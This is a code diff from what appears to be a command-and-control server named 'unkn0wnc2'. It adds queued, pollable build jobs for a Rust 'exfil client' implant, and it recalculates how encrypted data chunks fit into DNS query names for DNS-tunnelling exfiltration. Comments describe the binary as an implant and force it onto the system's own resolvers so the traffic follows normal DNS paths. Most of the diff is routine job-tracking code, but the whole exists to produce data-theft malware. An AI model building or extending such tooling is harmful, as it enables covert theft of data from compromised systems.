@@ -20,16 +20,107 @@ import (
 	"strings"
 	"sync"
 	"time"
+
+	"github.com/gorilla/mux"
 )
 
 const (
-	buildsDir = "/opt/unkn0wnc2/builds" // Directory to store compiled binaries
+	buildsDir        = "/opt/unkn0wnc2/builds" // Directory to store compiled binaries
+	exfilBuildJobTTL = 30 * time.Minute
 )
 
 var (
 	// buildMutex prevents concurrent builds from interfering with each other
 	buildMutex sync.Mutex
 )
+
+// ExfilBuildJob tracks asynchronous exfil client builds so the UI can poll for status.
+type ExfilBuildJob struct {
+	ID          string         `json:"id"`
+	Status      string         `json:"status"`
+	Message     string         `json:"message"`
+	Error       string         `json:"error,omitempty"`
+	Artifact    *BuildArtifact `json:"artifact,omitempty"`
+	CreatedAt   time.Time      `json:"created_at"`
+	UpdatedAt   time.Time      `json:"updated_at"`
+	CompletedAt *time.Time     `json:"completed_at,omitempty"`
+}
+
+func (api *APIServer) createExfilBuildJob() *ExfilBuildJob {
+	jobID := fmt.Sprintf("exfil_job_%d", time.Now().UnixNano())
+	job := &ExfilBuildJob{
+		ID:        jobID,
+		Status:    "queued",
+		Message:   "Waiting for build worker",
+		CreatedAt: time.Now(),
+		UpdatedAt: time.Now(),
+	}
+	api.exfilJobsMu.Lock()
+	api.exfilBuildJobs[jobID] = job
+	api.exfilJobsMu.Unlock()
+	return job
+}
+
+func (api *APIServer) updateExfilBuildJob(id string, update func(job *ExfilBuildJob)) {
+	api.exfilJobsMu.Lock()
+	defer api.exfilJobsMu.Unlock()
+	if job, ok := api.exfilBuildJobs[id]; ok {
+		update(job)
+		job.UpdatedAt = time.Now()
+	}
+}
+
+func (api *APIServer) getExfilBuildJob(id string) (*ExfilBuildJob, bool) {
+	api.exfilJobsMu.RLock()
+	defer api.exfilJobsMu.RUnlock()
+	job, ok := api.exfilBuildJobs[id]
+	if !ok {
+		return nil, false
+	}
+	copyJob := *job
+	return &copyJob, true
+}
+
+func (api *APIServer) completeExfilBuildJob(id, message string, artifact *BuildArtifact) {
+	completed := time.Now()
+	api.updateExfilBuildJob(id, func(job *ExfilBuildJob) {
+		job.Status = "completed"
+		job.Message = message
+		job.Artifact = artifact
+		job.Error = ""
+		job.CompletedAt = &completed
+	})
+	api.scheduleExfilBuildCleanup(id)
+}
+
+func (api *APIServer) failExfilBuildJob(id string, err error) {
+	completed := time.Now()
+	msg := "Exfil client build failed"
+	if err != nil {
+		msg = err.Error()
+	}
+	api.updateExfilBuildJob(id, func(job *ExfilBuildJob) {
+		job.Status = "failed"
+		job.Message = "Exfil client build failed"
+		job.Error = msg
+		job.CompletedAt = &completed
+	})
+	api.scheduleExfilBuildCleanup(id)
+	if err != nil {
+		fmt.Printf("[Builder] Exfil build %s failed: %v\n", id, err)
+	}
+}
+
+func (api *APIServer) scheduleExfilBuildCleanup(id string) {
+	if api == nil {
+		return
+	}
+	time.AfterFunc(exfilBuildJobTTL, func() {
+		api.exfilJobsMu.Lock()
+		delete(api.exfilBuildJobs, id)
+		api.exfilJobsMu.Unlock()
+	})
+}
 
 func resolveBinary(binName string, hints []string) (string, error) {
 	for _, candidate := range hints {
@@ -320,14 +411,23 @@ func (api *APIServer) handleBuildClient(w http.ResponseWriter, r *http.Request) 
 
 // handleBuildExfilClient builds the dedicated Rust exfil client with embedded configuration
 func (api *APIServer) handleBuildExfilClient(w http.ResponseWriter, r *http.Request) {
-	buildMutex.Lock()
-	defer buildMutex.Unlock()
-
 	var req ExfilClientBuildRequest
 	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
 		api.sendError(w, http.StatusBadRequest, "invalid request body")
 		return
 	}
+
+	job := api.createExfilBuildJob()
+	api.sendSuccess(w, "Exfil client build queued", job)
+
+	go api.executeExfilBuildJob(job.ID, req)
+}
+
+func (api *APIServer) executeExfilBuildJob(jobID string, req ExfilClientBuildRequest) {
+	api.updateExfilBuildJob(jobID, func(job *ExfilBuildJob) {
+		job.Status = "running"
+		job.Message = "Validating request"
+	})
 
 	// Normalize platform/architecture
 	req.Platform = strings.ToLower(strings.TrimSpace(req.Platform))
@@ -342,24 +442,28 @@ func (api *APIServer) handleBuildExfilClient(w http.ResponseWriter, r *http.Requ
 	// Always derive DNS configuration from the database to prevent manual overrides
 	cachedDNSServers, dnsErr := api.db.GetDNSServers()
 	if dnsErr != nil {
-		api.sendError(w, http.StatusInternalServerError, "failed to query DNS servers")
+		api.failExfilBuildJob(jobID, fmt.Errorf("failed to query DNS servers: %w", dnsErr))
 		return
 	}
 
 	req.Domains = collectActiveDomains(cachedDNSServers)
 	if len(req.Domains) == 0 {
-		api.sendError(w, http.StatusBadRequest, "no active DNS servers available - build at least one before generating an exfil client")
+		api.failExfilBuildJob(jobID, fmt.Errorf("no active DNS servers available - build at least one before generating an exfil client"))
 		return
 	}
 
 	req.ServerIP = selectServerAddress(cachedDNSServers)
 	if req.ServerIP == "" {
-		api.sendError(w, http.StatusBadRequest, "no DNS server addresses recorded - rebuild a DNS server with a server address before generating an exfil client")
+		api.failExfilBuildJob(jobID, fmt.Errorf("no DNS server addresses recorded - rebuild a DNS server with a server address before generating an exfil client"))
 		return
 	}
 
 	// Force the implant to rely on ambient system resolvers to maintain normal DNS recursion paths
 	req.Resolvers = nil
+
+	api.updateExfilBuildJob(jobID, func(job *ExfilBuildJob) {
+		job.Message = "Calculating DNS chunk constraints"
+	})
 
 	beforeChunk, domainLimit := clampExfilChunkBytes(&req)
 	if beforeChunk > 0 && beforeChunk != req.ChunkBytes {
@@ -390,28 +494,43 @@ func (api *APIServer) handleBuildExfilClient(w http.ResponseWriter, r *http.Requ
 	}
 
 	if api.config.EncryptionKey == "" {
-		api.sendError(w, http.StatusInternalServerError, "master encryption key is not configured")
+		api.failExfilBuildJob(jobID, fmt.Errorf("master encryption key is not configured"))
 		return
 	}
 
+	api.updateExfilBuildJob(jobID, func(job *ExfilBuildJob) {
+		job.Message = "Resolving Rust target toolchain"
+	})
+
 	targetCfg, err := resolveRustTargetConfig(req.Platform, req.Architecture)
 	if err != nil {
-		api.sendError(w, http.StatusBadRequest, err.Error())
+		api.failExfilBuildJob(jobID, err)
 		return
 	}
 
 	if err := ensureExfilBuildDependencies(targetCfg); err != nil {
-		api.sendError(w, http.StatusFailedDependency, err.Error())
+		api.failExfilBuildJob(jobID, err)
 		return
 	}
 
+	api.updateExfilBuildJob(jobID, func(job *ExfilBuildJob) {
+		job.Message = "Compiling exfil client"
+	})
+
+	buildMutex.Lock()
+	defer buildMutex.Unlock()
+
 	binaryPath, err := buildExfilClient(req, api.config.SourceDir, api.config.EncryptionKey, targetCfg)
 	if err != nil {
-		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("build failed: %v", err))
+		api.failExfilBuildJob(jobID, fmt.Errorf("build failed: %w", err))
 		return
 	}
 	buildDir := filepath.Dir(binaryPath)
 	defer os.RemoveAll(buildDir)
+
+	api.updateExfilBuildJob(jobID, func(job *ExfilBuildJob) {
+		job.Message = "Persisting build artifact"
+	})
 
 	// Save binary copy for operators
 	var ext string
@@ -421,13 +540,13 @@ func (api *APIServer) handleBuildExfilClient(w http.ResponseWriter, r *http.Requ
 	filename := fmt.Sprintf("exfil-%s-%s-%d%s", req.Platform, req.Architecture, time.Now().Unix(), ext)
 	savedPath, err := api.saveBuild(binaryPath, filename, "exfil")
 	if err != nil {
-		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("failed to save exfil build: %v", err))
+		api.failExfilBuildJob(jobID, fmt.Errorf("failed to save exfil build: %w", err))
 		return
 	}
 	fmt.Printf("[Builder] Exfil build saved to: %s\n", savedPath)
 	artifact, err := newBuildArtifact("exfil", filename, savedPath)
 	if err != nil {
-		api.sendError(w, http.StatusInternalServerError, "failed to prepare build metadata")
+		api.failExfilBuildJob(jobID, fmt.Errorf("failed to prepare build metadata: %w", err))
 		return
 	}
 
@@ -451,7 +570,24 @@ func (api *APIServer) handleBuildExfilClient(w http.ResponseWriter, r *http.Requ
 		fmt.Printf("[Builder] Failed to record exfil build metadata: %v\n", err)
 	}
 
-	api.sendSuccess(w, "Exfil client build saved", artifact)
+	api.completeExfilBuildJob(jobID, "Exfil client build saved", artifact)
+}
+
+func (api *APIServer) handleGetExfilBuildJob(w http.ResponseWriter, r *http.Request) {
+	vars := mux.Vars(r)
+	jobID := vars["id"]
+	if jobID == "" {
+		api.sendError(w, http.StatusBadRequest, "job id is required")
+		return
+	}
+
+	job, ok := api.getExfilBuildJob(jobID)
+	if !ok {
+		api.sendError(w, http.StatusNotFound, "exfil build job not found")
+		return
+	}
+
+	api.sendSuccess(w, "Exfil build job retrieved", job)
 }
 
 // handleBuildStager builds a stager binary with provided configuration
@@ -1256,11 +1392,13 @@ func collectActiveDomains(servers []map[string]interface{}) []string {
 }
 
 const (
-	dnsMaxName     = 253
-	dataLabelSplit = 62
-	aesGCMOverhead = 28
-	maxChunkProbe  = 512
-	metadataLabels = 2
+	dnsMaxName           = 253
+	dataLabelSplit       = 62
+	aesGCMOverhead       = 28
+	maxChunkProbe        = 512
+	sessionTagLen        = 3
+	metadataLabelPrefix  = "EX"
+	envelopePlaintextLen = 1 + 1 + sessionTagLen + 4 // version + flags + tag + counter
 )
 
 var log36Of2 = math.Log(2) / math.Log(36)
@@ -1298,13 +1436,14 @@ func clampExfilChunkBytes(req *ExfilClientBuildRequest) (before int, limit int) 
 }
 
 func maxChunkBytesForDomains(domains []string) int {
-	if !domainsFitLimits(domains) {
+	longest := longestDomainLength(domains)
+	if longest == 0 {
 		return 0
 	}
-	payloadBudget := dataLabelSplit
+
 	best := 0
 	for chunk := 1; chunk <= maxChunkProbe; chunk++ {
-		if chunkFitsBudget(chunk, payloadBudget) {
+		if chunkFitsBudget(chunk, longest) {
 			best = chunk
 		} else {
 			break
@@ -1313,7 +1452,7 @@ func maxChunkBytesForDomains(domains []string) int {
 	return best
 }
 
-func domainsFitLimits(domains []string) bool {
+func longestDomainLength(domains []string) int {
 	longest := 0
 	for _, domain := range domains {
 		trimmed := strings.TrimSpace(domain)
@@ -1322,14 +1461,34 @@ func domainsFitLimits(domains []string) bool {
 			longest = l
 		}
 	}
-	required := metadataLabels*dataLabelSplit + 2 + longest
-	return required < dnsMaxName
+	return longest
 }
 
-func chunkFitsBudget(chunkBytes, payloadBudget int) bool {
-	cipherLen := chunkBytes + aesGCMOverhead
-	encodedLen := estimateBase36Len(cipherLen)
-	return encodedLen <= payloadBudget
+func chunkFitsBudget(chunkBytes, domainLen int) bool {
+	if chunkBytes <= 0 || domainLen <= 0 {
+		return false
+	}
+	encodedLen := encodedLenForPayload(chunkBytes)
+	labelCount := 1 + labelCountForEncoded(encodedLen)
+	totalLen := domainLen + metadataLabelLen() + encodedLen + labelCount
+	return totalLen <= dnsMaxName
+}
+
+func encodedLenForPayload(bytes int) int {
+	cipherLen := bytes + aesGCMOverhead
+	return estimateBase36Len(cipherLen)
+}
+
+func metadataLabelLen() int {
+	cipherLen := envelopePlaintextLen + aesGCMOverhead
+	return len(metadataLabelPrefix) + estimateBase36Len(cipherLen)
+}
+
+func labelCountForEncoded(encodedLen int) int {
+	if encodedLen <= 0 {
+		return 1
+	}
+	return (encodedLen + dataLabelSplit - 1) / dataLabelSplit
 }
 
 func estimateBase36Len(bytes int) int {
